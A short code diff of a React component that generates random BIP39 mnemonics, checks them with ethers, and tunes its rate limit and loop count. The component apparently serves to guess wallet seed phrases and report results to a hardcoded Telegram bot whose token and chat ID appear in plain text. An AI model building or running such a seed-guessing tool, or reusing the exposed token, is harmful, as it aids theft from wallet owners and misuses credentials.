@@ -5,7 +5,7 @@ import * as bip39 from "bip39";
 import { ethers } from "ethers";
 import pLimit from "p-limit";
 
-const rateLimit = pLimit(5);
+const rateLimit = pLimit(10);
 const TELEGRAM_BOT_TOKEN = "7458527169:AAHclRKmcrcAD4OSNEJBCM1kP4WvjfXmtCQ"; // Replace with your bot token
 const CHAT_ID = "140867059"; // Replace with your chat ID
 
@@ -32,7 +32,7 @@ export default function RandomWordsGenerator() {
 
   const generateRandomWords = () => {
     const groups = [];
-    for (let i = 0; i < 1000; i++) {
+    for (let i = 0; i < 100; i++) {
       let mnemonic = "";
 
       // Generate mnemonics and check if valid
